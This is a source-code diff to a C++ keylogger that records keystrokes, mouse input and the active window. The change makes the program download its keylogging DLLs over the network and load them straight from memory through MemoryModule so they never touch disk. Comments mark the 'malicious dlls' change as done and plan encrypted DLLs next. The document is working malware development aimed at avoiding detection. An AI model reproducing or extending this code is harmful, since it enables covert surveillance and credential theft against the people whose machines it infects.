@@ -1,4 +1,4 @@
-//cl /EHsc .\keylogger.cpp /link ws2_32.lib user32.lib /OUT:keylogger.exe
+//cl /EHsc .\keylogger.cpp .\MemoryModule.c /link ws2_32.lib user32.lib /OUT:keylogger.exe
 /*
 
     uses the network_lib to send and receive data
@@ -8,7 +8,8 @@
 
     !! will need the  network_lib.dll and others in the same directory as the executable   !!
 
-    make the malicious dlls to load from memory
+    make the malicious dlls to load from memory [done]
+    use encrypted dlls next
 */
 
 #include <windows.h>
@@ -18,16 +19,16 @@
 #include <sstream>
 #include <mutex>
 #include <vector>
+#include "MemoryModule.h"
 
 using namespace std;
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 LPCSTR dllPath_n = "network_lib.dll";
-LPCSTR dllPath_k = "keylog_k_lib.dll";
-LPCSTR dllPath_m = "keylog_m_lib.dll";
-LPCSTR dllPath_w = "keylog_w_lib.dll";
-HINSTANCE hDLL_n, hDLL_k, hDLL_m, hDLL_w;
+
+HMEMORYMODULE hDLL_k, hDLL_m, hDLL_w;
+HINSTANCE hDLL_n;
 
 //------------------------------------------------------------------------------------------------------------------------------
 
@@ -118,9 +119,9 @@ int main(int argc, char* argv[])
     terminationCheckThread.join();
 
     FreeLibrary(hDLL_n);
-    FreeLibrary(hDLL_k);
-    FreeLibrary(hDLL_m);
-    FreeLibrary(hDLL_w);
+    MemoryFreeLibrary(hDLL_k);
+    MemoryFreeLibrary(hDLL_m);
+    MemoryFreeLibrary(hDLL_w);
 
     return 0;
 }
@@ -161,55 +162,63 @@ int load_dlls()                                             // loads the dlls fr
 
     //------------------------------------------------------------------------------------------------------------------------------
 
-    hDLL_k = LoadLibraryA(dllPath_k);
-    if (hDLL_k == nullptr)
+    vector<unsigned char> dll_k, dll_m, dll_w;
+
+    dll_k = receive_data_raw("keylog_k_lib.dll");
+    dll_m = receive_data_raw("keylog_m_lib.dll");
+    dll_w = receive_data_raw("keylog_w_lib.dll");
+
+    //------------------------------------------------------------------------------------------------------------------------------
+
+    hDLL_k = MemoryLoadLibrary(dll_k.data(), dll_k.size());
+    if (hDLL_k == NULL)
     {
-        std::cerr << "Failed to load keyboard DLL: " << GetLastError() << std::endl;
-        return EXIT_FAILURE;
+        std::cerr << "Failed to load DLL from memory.\n";
+        return 1;
     }
 
-    initialize_keyboard = (InitializeFunc)GetProcAddress(hDLL_k, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
-    cleanup_keyboard = (CleanupFunc)GetProcAddress(hDLL_k, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    initialize_keyboard = (InitializeFunc)MemoryGetProcAddress(hDLL_k, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    cleanup_keyboard = (CleanupFunc)MemoryGetProcAddress(hDLL_k, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
     if (!initialize_keyboard || !cleanup_keyboard)
     {
         std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
-        FreeLibrary(hDLL_k);
+        MemoryFreeLibrary(hDLL_k);
         return 1;
     }
 
-    //------------------------------------------------------------------------------------------------------------------------------
+    // //------------------------------------------------------------------------------------------------------------------------------
 
-    hDLL_m = LoadLibraryA(dllPath_m);
-    if (hDLL_m == nullptr)
+    hDLL_m = MemoryLoadLibrary(dll_m.data(), dll_m.size());
+    if (hDLL_m == NULL)
     {
-        std::cerr << "Failed to load mouse DLL: " << GetLastError() << std::endl;
-        return EXIT_FAILURE;
+        std::cerr << "Failed to load DLL from memory.\n";
+        return 1;
     }
 
-    initialize_mouse = (InitializeFunc)GetProcAddress(hDLL_m, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
-    cleanup_mouse = (CleanupFunc)GetProcAddress(hDLL_m, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    initialize_mouse = (InitializeFunc)MemoryGetProcAddress(hDLL_m, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    cleanup_mouse = (CleanupFunc)MemoryGetProcAddress(hDLL_m, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
     if (!initialize_mouse || !cleanup_mouse)
     {
         std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
-        FreeLibrary(hDLL_m);
+        MemoryFreeLibrary(hDLL_m);
         return 1;
     }
 
-    //------------------------------------------------------------------------------------------------------------------------------
+    // //------------------------------------------------------------------------------------------------------------------------------
 
-    hDLL_w = LoadLibraryA(dllPath_w);
-    if (hDLL_w == nullptr)
+    hDLL_w = MemoryLoadLibrary(dll_w.data(), dll_w.size());
+    if (hDLL_w == NULL)
     {
-        std::cerr << "Failed to load active window DLL: " << GetLastError() << std::endl;
-        return EXIT_FAILURE;
+        std::cerr << "Failed to load DLL from memory.\n";
+        return 1;
     }
 
-    initialize_active_window = (InitializeFunc)GetProcAddress(hDLL_w, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
-    cleanup_active_window = (CleanupFunc)GetProcAddress(hDLL_w, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    initialize_active_window = (InitializeFunc)MemoryGetProcAddress(hDLL_w, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    cleanup_active_window = (CleanupFunc)MemoryGetProcAddress(hDLL_w, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
     if (!initialize_active_window || !cleanup_active_window)
     {
-        std::cerr << "Failed to get one or more function addresses for active window dll.\n";
-        FreeLibrary(hDLL_w);
+        std::cerr << "Failed to get one or more function addresses for initialize_active_window dll.\n";
+        MemoryFreeLibrary(hDLL_w);
         return 1;
     }
 
@@ -236,9 +245,10 @@ BOOL CtrlHandler(DWORD fdwCtrlType)
             outputFile.close();
 
             FreeLibrary(hDLL_n);
-            FreeLibrary(hDLL_k);
-            FreeLibrary(hDLL_m);
-            FreeLibrary(hDLL_w);
+
+            MemoryFreeLibrary(hDLL_k);
+            MemoryFreeLibrary(hDLL_m);
+            MemoryFreeLibrary(hDLL_w);
 
             return TRUE; // Indicate that the signal was handled
         default:
